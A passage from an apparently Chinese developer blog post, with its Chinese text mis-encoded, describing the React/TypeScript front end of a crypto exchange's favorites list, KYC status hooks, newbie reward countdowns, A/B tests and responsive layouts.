                      <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> clickCollect(row, marketType)}
                    &gt;
                      {row.isCollected ? <span class="hljs-tag">&lt;<span class="hljs-name">StarFilled</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">StarOutlined</span> /&gt;</span>}
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                  <span class="hljs-tag">&lt;/<span class="hljs-name">Tooltip</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{row.icon}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{row.tradingPair}</span> /&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{row.tradingPair}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{row.price}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{row.change24h</span> &gt;</span>= 0 ? styles.positive : styles.negative}&gt;
                {row.change24h}%
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{row.volume24h}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">href</span>=<span class="hljs-string">{row.link}</span>&gt;</span>Trade<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          ))}
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>

      {/* åˆ†é¡µå™¨ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Pagination</span>
        <span class="hljs-attr">current</span>=<span class="hljs-string">{currentPage}</span>
        <span class="hljs-attr">total</span>=<span class="hljs-string">{filteredList?.length</span> || <span class="hljs-attr">0</span>}
        <span class="hljs-attr">pageSize</span>=<span class="hljs-string">{6}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setCurrentPage}</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>æ˜Ÿæ ‡æ ·å¼ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.starIcon</span> {
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">8px</span>;

  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.2</span>);
    <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.2s</span>;
  }

  <span class="hljs-comment">// é»„è‰²æ˜Ÿæ ‡ï¼ˆå·²æ”¶è—ï¼‰</span>
  :<span class="hljs-selector-tag">global</span>(.anticon-star) {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFD700</span>;
  }

  <span class="hljs-comment">// ç°è‰²æ˜Ÿæ ‡ï¼ˆæœªæ”¶è—ï¼‰</span>
  :<span class="hljs-selector-tag">global</span>(.anticon-star-outlined) {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#8C8C8C</span>;
  }
}
</code></pre>
<h4 data-id="heading-8">2.3 API æ¥å£å®ç°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /api/favorites.ts </span>

<span class="hljs-comment">// è·å–æ”¶è—åˆ—è¡¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getCollectInfo</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/member/preferences'</span>);
};

<span class="hljs-comment">// æ›´æ–°æ”¶è—åˆ—è¡¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateCollectInfo</span> = (<span class="hljs-params">data: {
  upsert_keys: {
    deriatives: <span class="hljs-built_in">string</span>;      // <span class="hljs-string">"BTC,ETH,SOL"</span>
    spotBookSymbolSequence: <span class="hljs-built_in">string</span>;  // <span class="hljs-string">"BTCUSDT,ETHUSDT,SOLUSDT"</span>
  }
}</span>) =&gt; {
  <span class="hljs-keyword">return</span> api.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/member/pref-setting'</span>, data);
};
</code></pre>
<h4 data-id="heading-9">2.4 æ–°æ‰‹ä»»åŠ¡å¥–åŠ±é›†æˆ</h4>
<p><strong>è‡ªå®šä¹‰ Hook: useNewbieTaskRewards</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /hooks/useNewbieTaskRewards.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useNewbieTaskRewards</span> = (<span class="hljs-params">taskType: <span class="hljs-string">'kyc'</span> | <span class="hljs-string">'deposit'</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> [taskData, setTaskData] = useState&lt;<span class="hljs-title class_">TaskData</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> tagId = taskType === <span class="hljs-string">'kyc'</span> ? <span class="hljs-string">'Gifts_Kyc'</span> : <span class="hljs-string">'Gifts_deposit'</span>;

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchTask</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {<span class="hljs-comment">//...è·å–æ¥å£æ•°æ®,å¾—åˆ°æ–°æ‰‹ä»»åŠ¡çš„å¥–åŠ±é‡‘é¢,æ—¶æ•ˆç­‰};</span>

    <span class="hljs-title function_">fetchTask</span>();
  }, [tagId]);

  <span class="hljs-keyword">return</span> taskData;
};
</code></pre>
<p><strong>å€’è®¡æ—¶ç»„ä»¶ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//components/CountdownTimer/index.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CountdownTimer</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">seconds</span>: <span class="hljs-built_in">number</span> }&gt; = <span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">CountdownTimer</span>(<span class="hljs-params">{ seconds }</span>) {
  <span class="hljs-keyword">const</span> [timeLeft, setTimeLeft] = <span class="hljs-title function_">useState</span>(seconds);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (timeLeft &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setTimeLeft</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, prev - <span class="hljs-number">1</span>));
    }, <span class="hljs-number">1000</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);
  }, [timeLeft]);

  <span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(timeLeft / <span class="hljs-number">86400</span>);
  <span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((timeLeft % <span class="hljs-number">86400</span>) / <span class="hljs-number">3600</span>);
  <span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((timeLeft % <span class="hljs-number">3600</span>) / <span class="hljs-number">60</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.countdown}</span>&gt;</span>
      {days}d {hours}h {minutes}m remaining
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  );
});
</code></pre>
<h4 data-id="heading-10">2.5 KYC çŠ¶æ€ç»†åŒ–</h4>
<p><strong>è‡ªå®šä¹‰ Hook: useKycStatus</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /hooks/useKycStatus.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">KycSubTaskStatus</span> {
  <span class="hljs-variable constant_">UNVERIFIED_ALL</span> = <span class="hljs-string">'3'</span>,      <span class="hljs-comment">// æœªè®¤è¯-å…¨éƒ¨</span>
  <span class="hljs-variable constant_">PASSED</span> = <span class="hljs-string">'2'</span>,              <span class="hljs-comment">// å·²é€šè¿‡</span>
  <span class="hljs-variable constant_">REVIEWING</span> = <span class="hljs-string">'1'</span>,           <span class="hljs-comment">// å®¡æ ¸ä¸­</span>
 <span class="hljs-comment">//..å…¶ä»–KYCçŠ¶æ€(éƒ¨åˆ†æœªè®¤è¯ã€æ‹’ç»å¯é‡è¯•ç­‰ç­‰)</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useKycStatus</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [status, setStatus] = useState&lt;<span class="hljs-title class_">KycSubTaskStatus</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [kycLevel, setKycLevel] = useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchKycStatus</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-comment">//è·å–ç”¨æˆ·çš„KYCçŠ¶æ€</span>
    };

    <span class="hljs-title function_">fetchKycStatus</span>();
  }, []);

  <span class="hljs-comment">// çŠ¶æ€æ–‡æ¡ˆæ˜ å°„</span>
  <span class="hljs-keyword">const</span> statusTextMap = {
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">REVIEWING</span>]: <span class="hljs-string">'Your KYC is being reviewed'</span>,
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">UNVERIFIED_ALL</span>]: <span class="hljs-string">'Verify your identity'</span>,
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">PASSED</span>]: <span class="hljs-string">'KYC verified'</span>
    <span class="hljs-comment">//...</span>
  };

  <span class="hljs-keyword">return</span> {
    status,
    kycLevel,
    <span class="hljs-attr">statusText</span>: statusTextMap[status] || <span class="hljs-string">''</span>,
    <span class="hljs-attr">isReviewing</span>: status === <span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">REVIEWING</span>
  };
};
</code></pre>
<h4 data-id="heading-11">2.6 AB å®éªŒæ§åˆ¶</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /Guides/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Guides</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { verified, isDeposit } = <span class="hljs-title function_">useNewMypageContext</span>();
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">status</span>: kycStatus } = <span class="hljs-title function_">useKycStatus</span>();

  <span class="hljs-comment">// AB å®éªŒåˆ†ç»„</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">abResult</span>: showKycState } = <span class="hljs-title function_">useSensors</span>({
    <span class="hljs-attr">param_name</span>: <span class="hljs-string">'showKycState'</span>,
    <span class="hljs-attr">default_value</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 0=å¯¹ç…§ç»„ï¼Œ1=å®éªŒç»„</span>
    <span class="hljs-attr">value_type</span>: <span class="hljs-string">'Number'</span>
  });

  <span class="hljs-keyword">const</span> { <span class="hljs-attr">abResult</span>: showRewards } = <span class="hljs-title function_">useSensors</span>({
    <span class="hljs-attr">param_name</span>: <span class="hljs-string">'showRewards'</span>,
    <span class="hljs-attr">default_value</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 0=ä¸æ˜¾ç¤ºå¥–åŠ±ï¼Œ1=æ˜¾ç¤ºå¥–åŠ±</span>
    <span class="hljs-attr">value_type</span>: <span class="hljs-string">'Number'</span>
  });

  <span class="hljs-comment">// æœª KYC çŠ¶æ€</span>
  <span class="hljs-keyword">if</span> (!verified) {
    <span class="hljs-keyword">if</span> (showKycState === <span class="hljs-number">1</span> &amp;&amp; kycStatus !== <span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">UNVERIFIED_ALL</span>) {
      <span class="hljs-comment">// å®éªŒç»„ï¼šæ˜¾ç¤ºè¯¦ç»† KYC çŠ¶æ€</span>
      <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">EnhancedKycGuide</span> <span class="hljs-attr">status</span>=<span class="hljs-string">{kycStatus}</span> <span class="hljs-attr">showRewards</span>=<span class="hljs-string">{showRewards</span> === <span class="hljs-string">1}</span> /&gt;</span></span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¯¹ç…§ç»„ï¼šæ˜¾ç¤ºåŸæœ‰ UI</span>
      <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyKycGuide</span> /&gt;</span></span>;
    }
  }

  <span class="hljs-comment">// å·² KYC ä½†æœªå……å€¼</span>
  <span class="hljs-keyword">if</span> (verified &amp;&amp; !isDeposit) {
    <span class="hljs-keyword">return</span> showRewards === <span class="hljs-number">1</span> ? (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">DepositGuideWithRewards</span> /&gt;</span></span>
    ) : (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyDepositGuide</span> /&gt;</span></span>
    );
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
};
</code></pre>
<h3 data-id="heading-12">ä¸‰ã€åŸ‹ç‚¹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Favorites åŒºåŸŸæ›å…‰</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (tabValue === <span class="hljs-string">'favorites'</span>) {
    track?.(<span class="hljs-string">'PageView'</span>, {
      <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites'</span>,
    });
  }
}, [tabValue, collectState]);

<span class="hljs-comment">// ç‚¹å‡»æ·»åŠ /åˆ é™¤æ”¶è—</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClickStar</span> = (<span class="hljs-params">item</span>) =&gt; {
  track?.(<span class="hljs-string">'PageClick'</span>, {
    <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
    <span class="hljs-attr">button_name</span>: item.<span class="hljs-property">isCollected</span> ? <span class="hljs-string">'Remove_from_Favorites'</span> : <span class="hljs-string">'Add_to_Favorites'</span>,
  });
};
</code></pre>
<h3 data-id="heading-13">å››ã€å“åº”å¼è®¾è®¡ä¸ H5 é€‚é…</h3>
<h4 data-id="heading-14">4.1 PC ç«¯å®ç°</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// PCMyPage/Markets/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Markets</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MarketDataProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.marketsContainer}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">SegmentedControl</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setValue}</span> <span class="hljs-attr">options</span>=<span class="hljs-string">{marketOptions}</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Tabs</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{tabValue}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setTabValue}</span> <span class="hljs-attr">tabs</span>=<span class="hljs-string">{tabsList}</span> /&gt;</span>
        {isEmpty ? (
          <span class="hljs-tag">&lt;<span class="hljs-name">NoFavorites</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onAddToFavorites</span>=<span class="hljs-string">{handleAdd}</span> /&gt;</span>
        ) : (
          <span class="hljs-tag">&lt;<span class="hljs-name">MarketDataTable</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">tabValue</span>=<span class="hljs-string">{tabValue}</span> /&gt;</span>
        )}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">MarketDataProvider</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-15">4.2 H5 ç«¯é€‚é…</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /H5MyPage/Markets/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">H5Markets</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// H5 ç«¯ä¸ä½¿ç”¨ Contextï¼Œç›´æ¥è°ƒç”¨ Hook</span>
  <span class="hljs-keyword">const</span> marketData = <span class="hljs-title function_">useMarket</span>({ <span class="hljs-comment">/* ... */</span> });
  <span class="hljs-keyword">const</span> { spotCollectState, contractCollectState } = <span class="hljs-title function_">useCollect</span>();

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.h5MarketsContainer}</span>&gt;</span>
      {/* å•åˆ—å¸ƒå±€ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">MobileSegmentedControl</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setValue}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MobileTabs</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{tabValue}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setTabValue}</span> /&gt;</span>
      {isEmpty ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">NoFavorites</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> /&gt;</span>  {/* Grid è‡ªåŠ¨å˜ä¸ºå•åˆ— */}
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">MobileMarketDataTable</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">tabValue</span>=<span class="hljs-string">{tabValue}</span> /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>H5 æ ·å¼é€‚é…ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// H5MyPage/Markets/index.module.less</span>
<span class="hljs-selector-class">.h5MarketsContainer</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;

  <span class="hljs-selector-class">.grid</span> {
    <span class="hljs-attribute">display</span>: grid;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;  <span class="hljs-comment">// å•åˆ—</span>
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">12px</span>;
  }

  <span class="hljs-selector-class">.table</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;  <span class="hljs-comment">// PC ç«¯ 16px</span>

    <span class="hljs-selector-tag">td</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span>;  <span class="hljs-comment">// PC ç«¯ 12px</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-16">äº”ã€æŠ€æœ¯éš¾ç‚¹ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-17">é—®é¢˜2: Icon åœ¨æµ‹è¯•ç¯å¢ƒï¼ˆU1ï¼‰æ— æ³•æ˜¾ç¤º</h4>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>ç”Ÿäº§ç¯å¢ƒå›¾ç‰‡æ­£å¸¸æ˜¾ç¤º</li>
<li>U1 æµ‹è¯•ç¯å¢ƒå›¾ç‰‡è¿”å› 404</li>
</ul>
<p><strong>æ ¹å› åˆ†æï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç¡¬ç¼–ç  CDN åŸŸå</span>
<span class="hljs-keyword">const</span> iconUrl = <span class="hljs-string">`https://cdn.exchange.com/images/<span class="hljs-subst">${item.icon}</span>`</span>;
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç¯å¢ƒå˜é‡åŠ¨æ€é…ç½®</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getCdnUrl</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> envMap = {
    <span class="hljs-string">'unify-test-1'</span>: <span class="hljs-string">'https://cdn-test.exchange.com'</span>,
    <span class="hljs-string">'gtd-test-1'</span>: <span class="hljs-string">'https://cdn-gtd-test.exchange.com'</span>,
    <span class="hljs-string">'production'</span>: <span class="hljs-string">'https://cdn.exchange.com'</span>
  };
  <span class="hljs-keyword">return</span> envMap[process.<span class="hljs-property">env</span>.<span class="hljs-property">PIPELINE_ENV</span>] || envMap.<span class="hljs-property">production</span>;
};

<span class="hljs-keyword">const</span> iconUrl = <span class="hljs-string">`<span class="hljs-subst">${getCdnUrl()}</span>/images/<span class="hljs-subst">${item.icon}</span>`</span>;
</code></pre>
<h4 data-id="heading-18">é—®é¢˜3: æ”¶è—ç«‹å³æ¶ˆå¤±å½±å“ç”¨æˆ·ä½“éªŒ</h4>
<p><strong>éœ€æ±‚ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ç‚¹å‡»å–æ¶ˆæ”¶è—åï¼Œä¸è¦ç«‹å³ä»åˆ—è¡¨ä¸­ç§»é™¤</li>
<li>ç­‰ä¸‹æ¬¡åˆ‡æ¢ Tab æˆ–åˆ·æ–°é¡µé¢æ—¶å†åŒæ­¥</li>
</ul>
<p><strong>å®ç°æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [pendingUnfavorites, setPendingUnfavorites] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

<span class="hljs-comment">// ç‚¹å‡»å–æ¶ˆæ”¶è—æ—¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUnfavorite</span> = (<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-comment">// 1. æ·»åŠ åˆ°å¾…ç§»é™¤åˆ—è¡¨ï¼ˆç”¨äºè§†è§‰åé¦ˆï¼‰</span>
  <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(prev).<span class="hljs-title function_">add</span>(id));

  <span class="hljs-comment">// 2. è°ƒç”¨ APIï¼ˆå¼‚æ­¥ï¼‰</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">clickCollect</span>(item, marketType);

  <span class="hljs-comment">// 3. ä¸ç«‹å³ä» collectState ä¸­ç§»é™¤</span>
};

<span class="hljs-comment">// æ¸²æŸ“æ—¶è¿‡æ»¤å¾…ç§»é™¤é¡¹ï¼ˆè§†è§‰ä¸Šæ¶ˆå¤±ï¼‰</span>
<span class="hljs-keyword">const</span> displayList = filteredList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> 
  !pendingUnfavorites.<span class="hljs-title function_">has</span>(<span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">tradingPair</span>))
);

<span class="hljs-comment">// åˆ‡æ¢ Tab æ—¶åˆ·æ–°æ•°æ®</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (tabValue === <span class="hljs-string">'favorites'</span>) {
    <span class="hljs-title function_">refreshCollectInfo</span>();  <span class="hljs-comment">// åŒæ­¥æœåŠ¡ç«¯æ•°æ®</span>
    <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());  <span class="hljs-comment">// æ¸…ç©ºå¾…ç§»é™¤åˆ—è¡¨</span>
  }
}, [tabValue]);
</code></pre>
<h4 data-id="heading-19">é—®é¢˜4: æ–°æ‰‹ä»»åŠ¡è¿‡æœŸåˆ¤æ–­ä¸å‡†ç¡®</h4>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>æœåŠ¡ç«¯æœªåŠæ—¶æ¸…ç†è¿‡æœŸä»»åŠ¡</li>
<li>å‰ç«¯æ˜¾ç¤ºå·²è¿‡æœŸä»»åŠ¡çš„å¥–åŠ±é‡‘é¢</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… åŒé‡åˆ¤æ–­ï¼šæœåŠ¡ç«¯è¿”å› + å‰ç«¯è®¡ç®—</span>
<span class="hljs-keyword">const</span> isTaskValid = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!taskData) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (taskData.<span class="hljs-property">remain_sec</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

  <span class="hljs-comment">// é¢å¤–æ ¡éªŒï¼šæ³¨å†Œå &gt;7 å¤©è‡ªåŠ¨è¿‡æœŸ</span>
  <span class="hljs-keyword">const</span> registrationTime = userInfo.<span class="hljs-property">created_at</span>;
  <span class="hljs-keyword">const</span> daysSinceRegistration = (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - registrationTime) / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>);
  <span class="hljs-keyword">return</span> daysSinceRegistration &lt;= <span class="hljs-number">7</span>;
}, [taskData, userInfo]);

<span class="hljs-comment">// è¿‡æœŸå›é€€åˆ°åŸæœ‰ UI</span>
<span class="hljs-keyword">return</span> isTaskValid ? (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">GuideWithRewards</span> <span class="hljs-attr">taskData</span>=<span class="hljs-string">{taskData}</span> /&gt;</span></span>
) : (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyGuide</span> /&gt;</span></span>
);
</code></pre>
<h2 data-id="heading-20">R (Result) - é¡¹ç›®æˆæœ</h2>
<h3 data-id="heading-21">ä¸€ã€åŠŸèƒ½äº¤ä»˜æˆæœ</h3>
<p>âœ… <strong>Markets æ”¶è—åŠŸèƒ½ï¼ˆå·²å…¨é‡ä¸Šçº¿ï¼‰</strong></p>
<ul>
<li>Favorites æ ‡ç­¾é¡µï¼ˆç©ºçŠ¶æ€ + æ”¶è—åˆ—è¡¨ï¼‰</li>
<li>æ˜Ÿæ ‡äº¤äº’è¦†ç›– 5 ä¸ªæ’è¡Œæ¦œï¼ˆHot/NewListing/Gainers/Losers/Turnoverï¼‰</li>
<li>PC + H5 åŒç«¯å®Œæ•´é€‚é…</li>
<li>ç°è´§å’Œè¡ç”Ÿå“ç‹¬ç«‹ç®¡ç†</li>
<li>åˆ†é¡µåŠŸèƒ½ï¼ˆæ¯é¡µ 6 ä¸ªï¼Œè¶…è¿‡æ˜¾ç¤ºåˆ†é¡µå™¨ï¼‰</li>
<li>å»¶è¿Ÿåˆ·æ–°æœºåˆ¶ï¼ˆåˆ‡æ¢ Tab æ—¶åŒæ­¥ï¼‰</li>
</ul>
